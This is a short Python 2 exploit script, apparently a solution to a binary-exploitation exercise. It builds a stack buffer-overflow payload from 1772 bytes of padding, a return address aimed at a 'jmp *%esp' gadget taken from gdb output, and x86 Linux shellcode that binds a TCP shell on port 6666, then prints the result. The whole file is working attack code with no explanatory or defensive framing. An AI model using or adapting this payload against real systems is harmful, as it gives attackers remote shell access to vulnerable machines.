#!/usr/bin/env python
#!/bin/sh

# Linux (x86) TCP shell binding to port 6666.
bind_shell =\
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +\
"\x80\x5b\x5e\x52\x68\x02\x00\x1a\x0a\x6a\x10\x51\x50\x89" +\
"\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd" +\
"\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49" +\
"\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +\
"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

size = "\x06\xec"
adr = "\x1c\x86\x04\x08"

# // (gdb) x/i 0x08048619
# //    0x8048619 <magic+21>:	orl    $0xe4ff,0x8(%ebp)
# // (gdb) x/i 0x0804861c
# //    0x804861c <magic+24>:	jmp    *%esp


pad = "\x55" * 1772


print pad + adr + bind_shell





